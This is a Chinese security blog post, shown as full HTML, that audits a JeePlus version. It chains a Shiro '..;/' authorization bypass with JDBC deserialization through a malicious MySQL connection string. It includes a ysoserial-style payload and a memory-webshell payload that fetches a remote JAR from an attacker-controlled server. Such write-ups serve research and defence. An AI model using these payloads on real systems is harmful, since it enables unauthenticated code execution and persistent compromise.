

<!DOCTYPE html>
<html lang="" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="审计记录">
<meta property="og:type" content="article">
<meta property="og:title" content="JeePlus某版本JDBC反序列化">
<meta property="og:url" content="http://novysodope.github.io/2023/07/07/108/index.html">
<meta property="og:site_name" content="novy&#39;s Blog">
<meta property="og:description" content="审计记录">
<meta property="og:locale">
<meta property="og:image" content="http://novysodope.github.io/images/108/E0JEhnhctTjUDJW6FY-qAS6EWYbrEtqMd03OIhNrAAE.png">
<meta property="og:image" content="http://novysodope.github.io/images/108/PG56-WdXdn-8IyhvXzxBJbWXXkjNmyKyEhIy44FZZH4.png">
<meta property="og:image" content="http://novysodope.github.io/images/108/nt0Bmj2LA4eyskikk2TCGVIy0CqFCe26g8OCrP4zfQ.png">
<meta property="og:image" content="http://novysodope.github.io/images/108/XtyPJ2bCpPR6gufw-wyATqfw91Z9GDSkyZ9tTU-X3eY.png">
<meta property="og:image" content="http://novysodope.github.io/images/108/AYp6MWPcnj5XgIpArGa4V32znu1kqcgCnCmWJl5Cu0.png">
<meta property="og:image" content="http://novysodope.github.io/images/108/3nzyIKvBiTeCTiMHz1kwuORKI9pAs81b0kDkHhZtt8.png">
<meta property="og:image" content="http://novysodope.github.io/images/108/xu8DaXi45iqIYTyWrt7KDZZfNyf-PZKR0YS24RzMA.png">
<meta property="og:image" content="http://novysodope.github.io/images/108/96opqNiG3BGZgNDwH9mU9d6ca5Whc0U9rCNMTkcZA.png">
<meta property="og:image" content="http://novysodope.github.io/images/108/uSkqDt3t4LPDY1qwsFak0j1zL7UG7gi74w5LlGeV40Y.png">
<meta property="og:image" content="http://novysodope.github.io/images/108/xcd83309Xe0HWJfmkLmHtS59uAYguimM2LRLHg5dtw.png">
<meta property="og:image" content="http://novysodope.github.io/images/108/toMKFrCRxO0KzLfAmpft3Uxlx5lcRUY5aMHpC6ITcc.png">
<meta property="article:published_time" content="2023-07-07T05:35:21.000Z">
<meta property="article:modified_time" content="2024-05-07T08:03:04.879Z">
<meta property="article:author" content="novy">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://novysodope.github.io/images/108/E0JEhnhctTjUDJW6FY-qAS6EWYbrEtqMd03OIhNrAAE.png">
  
  <title>JeePlus某版本JDBC反序列化 - novy&#39;s Blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  



<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"novysodope.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6,h7,h8,h9","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a6c1581442f57290135c4581f8de49ff","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.3.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>novy&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友情链接
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="JeePlus某版本JDBC反序列化">
              
            </span>

            
              <div class="mt-3">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-author" aria-hidden="true"></i>
      novy
    </span>
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2023-07-07 13:35" pubdate>
        July 7, 2023 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      1.3k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      4 分钟
    </span>
  

  
  
    

      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">JeePlus某版本JDBC反序列化</h1>
            
            <div class="markdown-body">
              <p>首先在依赖中发现目标使用了shiro 1.4</p>
<p>已知下列请求不用鉴权</p>
<p><code>WEB-INF/classes/spring/spring-context-shiro.xml</code></p>
<p><img src="/images/108/E0JEhnhctTjUDJW6FY-qAS6EWYbrEtqMd03OIhNrAAE.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>在过滤器中，<code>&lt;url-pattern&gt;/**&lt;/url-pattern&gt;</code>配置会匹配所有url（匹配当前文件夹下文件和子文件夹下文件），比如<code>/api/aaa</code>、<code>/api/aaa/aaaa</code>、<code>/api/aaa/aaaa/aaaa.jsp</code>等等。众所周知，<code>../</code>可以跨目录，所以这种情况下可以使用<code>/api/../admin</code>来跨一级访问admin页面，因为<code>/api/../admin</code>也属于<code>/api/**</code>的范围。</p>
<p> </p>
<p>当<code>../</code>被过滤或者有waf拦截时，URL中有一个保留字符分号<code>(;)</code>，主要作为参数分隔符进行使用，对于<code>request.getRequestURL()</code>和<code>request.getRequestURI()</code>来说，使用<code>&amp;</code>连接的参数键值，对其来说是获取不到的，但是参数分隔符<code>(;)</code>及内容是可以获取到的，所以也可以使用<code>..;/</code>、<code>..;a/</code>等等来绕过。</p>
<p> </p>
<p>对于<code>..;/</code>的更多用法，可以看</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10799">https://xz.aliyun.com/t/10799</a></p>
<p> </p>
<p>回到配置文件中，有关<code>/**</code>的配置可以用作权限绕过</p>
<p> </p>
<p>在shiro中，<code>@RequiresPermissions</code>是用来分配用户角色权限的，接口会按照注解的值来决定哪个角色能访问当前请求</p>
<p><img src="/images/108/PG56-WdXdn-8IyhvXzxBJbWXXkjNmyKyEhIy44FZZH4.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>当包含有该注解配置了属性值时，即使利用了<code>..;</code>也会无法绕过，因为<code>..;</code>时shiro获取到的attribute是anon，与注解的属性不匹配：</p>
<p><img src="/images/108/nt0Bmj2LA4eyskikk2TCGVIy0CqFCe26g8OCrP4zfQ.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>所以要找没有RequiresPermissions注解的接口</p>
<p> </p>
<p>经过查找，发现<code>executeSql</code>方法没有RequiresPermissions注解</p>
<p>在<code>executeSql</code>方法中，sql语句会传进数据库进行执行</p>
<p><img src="/images/108/XtyPJ2bCpPR6gufw-wyATqfw91Z9GDSkyZ9tTU-X3eY.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>但是在传进执行前，<code>sysDataSource</code>对象会先被传进<code>MultiDBUtils</code>类的<code>init</code>方法进行初始化，以便后面的sql语句能够有引擎执行，<code>init</code>方法：</p>
<p><img src="/images/108/AYp6MWPcnj5XgIpArGa4V32znu1kqcgCnCmWJl5Cu0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>初始化完成后就将dataSource设置为jdbc引擎以供后方的sql执行使用</p>
<p><img src="/images/108/3nzyIKvBiTeCTiMHz1kwuORKI9pAs81b0kDkHhZtt8.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>因为在executeSql方法中，SysDataSource对象是被当作参数来传进使用的</p>
<p><img src="/images/108/xu8DaXi45iqIYTyWrt7KDZZfNyf-PZKR0YS24RzMA.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>所以根据SysDataSource的各参数构造数据源即可利用</p>
<p><img src="/images/108/96opqNiG3BGZgNDwH9mU9d6ca5Whc0U9rCNMTkcZA.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>自带的mysql驱动刚好版本存在漏洞</p>
<p><img src="/images/108/uSkqDt3t4LPDY1qwsFak0j1zL7UG7gi74w5LlGeV40Y.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>利用链同样自带：</p>
<p>CbNOC、cc9、10、11</p>
<p><img src="/images/108/xcd83309Xe0HWJfmkLmHtS59uAYguimM2LRLHg5dtw.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>搭配权限绕过利用：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;dbUserName=yso_CommonsCollections11_calc</span><br></code></pre></div></td></tr></table></figure>
<p><img src="/images/108/toMKFrCRxO0KzLfAmpft3Uxlx5lcRUY5aMHpC6ITcc.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<h1 id="打内存马思路"><a href="#打内存马思路" class="headerlink" title="打内存马思路"></a><strong>打内存马思路</strong></h1><p>内存马打包成jar，放在开启web服务的服务器上，使用payload</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">yso_CommonsCollections11_remote-code-http:<span class="hljs-comment">//web/POC.jar#MemshellClass</span><br></code></pre></div></td></tr></table></figure>
<p>其中<a target="_blank" rel="noopener" href="http://web/POC.jar#MemshellClass%E5%8F%AF%E6%8E%A7%EF%BC%8CMemshellClass%E6%98%AF%E5%86%85%E5%AD%98%E9%A9%AC%E7%B1%BB%E5%90%8D">http://web/POC.jar#MemshellClass可控，MemshellClass是内存马类名</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    声明：<br>   本文章用于学习交流，严禁用于非法操作，出现后果一切自行承担，阅读此文章表示你已同意本声明。<br> <br> Disclaimer: <br>   This article is for study and communication. It is strictly forbidden to use it for illegal operations. All consequences shall be borne by yourself. Reading this article means that you have agreed to this statement.
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/07/25/102/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">By pass security check: do not allow ../ in path</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/07/05/101/">
                        <span class="hidden-mobile">javaweb中的权限绕过</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-x-md">
    <div class="container custom post-custom mx-auto">
      <img src="/img/aa.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;"><p></p> <p style="text-align:center"><span>扫一扫关注我们</span></p>
    </div>
  </div>


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     © 2018-<script type="text/javascript">document.write(new Date().getFullYear());</script> <span> <a href="#" target="_blank" rel="nofollow noopener"><font color="#2ca6cb">novy`s Blog</font>.</a> </span> Powered by <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span><font color="#2ca6cb">Hexo</font></span></a><p><script> function secondToDate(second) { if (!second) { return 0; } var time = new Array(0, 0, 0, 0, 0); if (second >= 365 * 24 * 3600) { time[0] = parseInt(second / (365 * 24 * 3600)); second %= 365 * 24 * 3600; } if (second >= 24 * 3600) { time[1] = parseInt(second / (24 * 3600)); second %= 24 * 3600; } if (second >= 3600) { time[2] = parseInt(second / 3600); second %= 3600; } if (second >= 60) { time[3] = parseInt(second / 60); second %= 60; } if (second > 0) { time[4] = second; } return time; }</script> <script type="text/javascript" language="javascript"> function setTime() { var create_time = Math.round(new Date(Date.UTC(2018, 11, 09, 6, 6, 6)).getTime() / 1000); var timestamp = Math.round((new Date().getTime() + 8 * 60 * 60 * 1000) / 1000); currentTime = secondToDate((timestamp - create_time)); currentTimeHtml = currentTime[0] + "年" + currentTime[1] + "天" + currentTime[2] + "时" + currentTime[3] + "分" + currentTime[4] + "秒"; document.getElementById("htmer_time").innerHTML = currentTimeHtml; }    setInterval(setTime, 1000);</script> 本博客已经稳定运行：<span id="htmer_time" style="color: #2ca6cb;"></span> <br/> <script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

你是第<font color="#2ca6cb"><span id="busuanzi_value_site_uv"></span></font>个小伙伴 </p> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  
    <!-- Baidu Analytics -->
    <script defer>
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?a6c1581442f57290135c4581f8de49ff";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  

  

  

  

  






<script  src="/js/boot.js" ></script>


</body>
</html>
